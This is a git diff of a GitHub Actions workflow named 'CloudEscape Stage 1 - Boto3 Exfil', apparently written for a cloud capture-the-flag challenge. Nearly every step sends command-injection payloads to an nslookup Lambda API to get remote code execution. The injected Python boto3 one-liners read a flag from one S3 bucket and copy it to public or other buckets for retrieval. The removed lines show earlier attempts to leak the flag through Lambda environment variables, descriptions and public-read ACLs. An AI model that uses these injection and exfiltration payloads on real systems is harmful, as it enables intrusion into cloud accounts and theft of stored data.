@@ -1,4 +1,4 @@
-name: CloudEscape Stage 1 - Env Exfil
+name: CloudEscape Stage 1 - Boto3 Exfil
 on:
   workflow_dispatch:
   push:
@@ -18,78 +18,108 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      # ── Step 1: Simple test - can the Lambda's aws CLI list buckets? ──
-      # This writes to CloudWatch - we can't see it, but it confirms RCE
-      - name: Test 1 - Confirm RCE with simple commands
+      # ── 1. Get all bucket policies first ──
+      - name: Get bucket policies
+        run: |
+          echo "===== List all buckets ====="
+          aws s3 ls 2>&1
+          
+          echo "===== Platform bucket policy ====="
+          aws s3api get-bucket-policy --bucket platform-bucket-009661764077-us-east-1 --region us-east-1 2>&1 || echo "No policy"
+          
+          echo "===== Codec bucket policy ====="
+          aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 --region us-east-1 2>&1 || echo "No policy"
+          
+          echo "===== Site bucket policy ====="
+          aws s3api get-bucket-policy --bucket site781fe43f26b9eba3 --region us-east-1 2>&1 || echo "No policy"
+          
+          echo "===== Codec bucket ACL ====="
+          aws s3api get-bucket-acl --bucket codec4f26c862a321ef5 --region us-east-1 2>&1 || echo "No ACL"
+          
+          echo "===== Platform bucket ACL ====="
+          aws s3api get-bucket-acl --bucket platform-bucket-009661764077-us-east-1 --region us-east-1 2>&1 || echo "No ACL"
+
+      # ── 2. Use Python boto3 in Lambda to read flag and try to exfil ──
+      - name: Boto3 Exfil - Read flag and try all buckets
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          echo "===== Simple echo test ====="
+          
+          # Python one-liner: read flag, try to write to every bucket
+          PAYLOAD='{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); flag=s3.get_object(Bucket=\\x27codec4f26c862a321ef5\\x27,Key=\\x27flag.txt\\x27)[\\x27Body\\x27].read(); s3.put_object(Bucket=\\x27platform-bucket-009661764077-us-east-1\\x27,Key=\\x27flag.txt\\x27,Body=flag)\""}'
+          
+          echo "===== Boto3: read flag + write to platform bucket ====="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
+          sleep 5
+          echo "===== Read from platform bucket ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/flag.txt" 2>&1
+
+      # ── 3. Boto3: generate presigned URL and write to platform bucket ──
+      - name: Boto3 Exfil - Presigned URL
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          PAYLOAD='{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); url=s3.generate_presigned_url('get_object',Params={'Bucket':'codec4f26c862a321ef5','Key':'flag.txt'},ExpiresIn=3600); s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='presign.txt',Body=url)\""}'
+          
+          echo "===== Boto3: presigned URL + write to platform bucket ====="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
+          sleep 5
+          echo "===== Read presign.txt from platform bucket ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/presign.txt" 2>&1
+
+      # ── 4. Write a Python script to /tmp in Lambda and execute it ──
+      - name: Boto3 Exfil - Write script to Lambda /tmp and run
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Write a python script to /tmp via echo, then execute it
+          echo "===== Write Python script to Lambda /tmp ====="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; echo RCE_CONFIRMED > /tmp/rce.txt"}' 2>&1
+            -d '{"domain": "x; echo \"import boto3\ns3=boto3.client('"'"'s3'"'"')\nflag=s3.get_object(Bucket='"'"'codec4f26c862a321ef5'"'"',Key='"'"'flag.txt'"'"')['"'"'Body'"'"'].read()\nprint(flag)\ns3.put_object(Bucket='"'"'platform-bucket-009661764077-us-east-1'"'"',Key='"'"'flag.txt'"'"',Body=flag)\n\" > /tmp/exfil.py"}' 2>&1
+          
           sleep 2
-
-      # ── Step 2: Copy flag to /tmp, then update Lambda env in separate call ──
-      - name: Test 2 - Copy flag to /tmp
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          echo "===== Copy flag to /tmp ====="
+          
+          echo "===== Execute script ====="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt"}' 2>&1
-          sleep 3
-
-      # ── Step 3: Use a Python one-liner to update Lambda env ──
-      # The Lambda's timeout is 15s so we need fast commands
-      - name: Test 3 - Update env var with flag content
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          echo "===== Update Lambda env with flag ====="
-          # Try using the Lambda's own aws CLI to update its env
-          # The flag is in /tmp/flag.txt from step 2
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; F=$(cat /tmp/flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --environment Variables={FLAG=$F}"}' 2>&1
-          sleep 8
-
-      # ── Step 4: Read the env var ──
-      - name: Test 4 - Read Lambda env
-        run: |
-          echo "===== Read Lambda config ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
-
-      # ── Step 5: Try with a different approach - put flag in Lambda description ──
-      - name: Test 5 - Put flag in Lambda description
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          echo "===== Update Lambda description with flag ====="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; F=$(cat /tmp/flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --description $F"}' 2>&1
-          sleep 8
-          echo "===== Read description ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' 2>&1
-
-      # ── Step 6: Try using S3 copy with the Lambda's own creds to write to codec bucket ──
-      - name: Test 6 - Write flag to codec bucket under new key
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          echo "===== Copy flag to new key in codec bucket ====="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/exfil.txt"}' 2>&1
+            -d '{"domain": "x; python3 /tmp/exfil.py"}' 2>&1
+          
           sleep 5
-          echo "===== Try to read exfil.txt from codec bucket ====="
-          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1
+          echo "===== Read flag from platform bucket ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/flag.txt" 2>&1
 
-      # ── Step 7: Try writing flag to a public object via bucket ACL ──
-      - name: Test 7 - Copy flag and set public ACL
+      # ── 5. Try writing flag to site bucket via CloudFront origin ──
+      - name: Boto3 Exfil - Write to site bucket
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          echo "===== Copy flag to platform bucket with public-read ACL ====="
+          
+          echo "===== Boto3: write flag to site bucket ====="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/public_flag.txt --acl public-read"}' 2>&1
-          sleep 5
-          echo "===== Read public_flag.txt ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/public_flag.txt" 2>&1
+            -d '{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read(); s3.put_object(Bucket='site781fe43f26b9eba3',Key='flag.txt',Body=flag)\""}' 2>&1
+          
+          sleep 8
+          echo "===== Read via CloudFront ====="
+          curl -s "https://d67nf28gqfurd.cloudfront.net/flag.txt" 2>&1
 
-      # ── Step 8: If env var update worked, read it now ──
-      - name: Final env check
+      # ── 6. Try: list all S3 buckets from Lambda and write to platform ──
+      - name: Boto3 - List buckets from Lambda
         run: |
-          echo "===== Final Lambda config with env ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print('ENV:', d.get('Environment',{}).get('Variables',{})); print('DESC:', d.get('Description',''))" 2>&1 || aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          echo "===== Boto3: list buckets and write to platform ====="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
+            -d '{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); r=s3.list_buckets(); names=[b['Name'] for b in r['Buckets']]; s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='buckets.txt',Body=''"'"'\\n'"'"'.join(names))\""}' 2>&1
+          
+          sleep 5
+          echo "===== Read buckets.txt from platform bucket ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/buckets.txt" 2>&1
+
+      # ── 7. Read all results from platform bucket ──
+      - name: Final check - read all objects from platform bucket
+        run: |
+          echo "===== List platform bucket objects ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || echo "Can't list"
+          
+          for obj in flag.txt presign.txt buckets.txt exfil.txt f.txt ls.txt public_flag.txt stav_flag.txt; do
+            echo "--- $obj ---"
+            curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/$obj" 2>&1 | head -5
+            echo
+          done
